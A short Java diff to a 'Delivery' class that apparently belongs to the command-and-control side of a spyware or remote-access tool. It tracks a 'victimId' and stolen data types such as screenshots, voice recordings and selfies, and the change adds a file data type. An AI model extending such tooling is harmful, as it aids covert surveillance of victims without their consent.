@@ -14,6 +14,7 @@ public class Delivery {
     public static final String TYPE_RE_JOIN = "re_join";
     public static final String TYPE_MEDIA = "media";
     public static final String TYPE_OTHER = "other";
+    public static final String TYPE_FILE = "file";
     public static final String TYPE_COMMAND_STATUSES = "command_statuses";
     private String relativeSyncTime;
 
@@ -36,6 +37,7 @@ public class Delivery {
     private static final String TYPE_MEDIA_SCREEN_SHOT = "media_screen_shot";
     private static final String TYPE_MEDIA_VOICE = "media_voice";
     private static final String TYPE_MEDIA_SELFIE = "media_selfie";
+    private static final String TYPE_MEDIA_FILE = "media_file";
 
     private final String id, victimId, message, createdAt;
     private String dataType;
@@ -84,6 +86,7 @@ public class Delivery {
             case TYPE_RE_JOIN:
             case TYPE_COMMAND_STATUSES:
             case TYPE_OTHER:
+            case TYPE_FILE:
                 break;
 
             default:
@@ -154,7 +157,7 @@ public class Delivery {
         }
 
 
-        /*private boolean isValid() {
+        private boolean isValid() {
 
             switch (this.dataType) {
 
@@ -165,6 +168,7 @@ public class Delivery {
                 case TYPE_MEDIA_SCREEN_SHOT:
                 case TYPE_MEDIA_VOICE:
                 case TYPE_MEDIA_SELFIE:
+                case TYPE_MEDIA_FILE:
                     return true;
 
                 default:
@@ -172,12 +176,12 @@ public class Delivery {
                     return false;
             }
 
-        }*/
+        }
 
         /**
          * @return true if the current dataType is binary, otherwise false.
          */
-        public boolean isBinary() {
+        /*public boolean isBinary() {
             switch (this.dataType) {
 
                 case TYPE_FILES:
@@ -194,7 +198,7 @@ public class Delivery {
                 default:
                     throw new IllegalArgumentException(this.dataType + " data type is not managed.");
             }
-        }
+        }*/
 
         /**
          * Initialize the storage paths of the all binary data types.
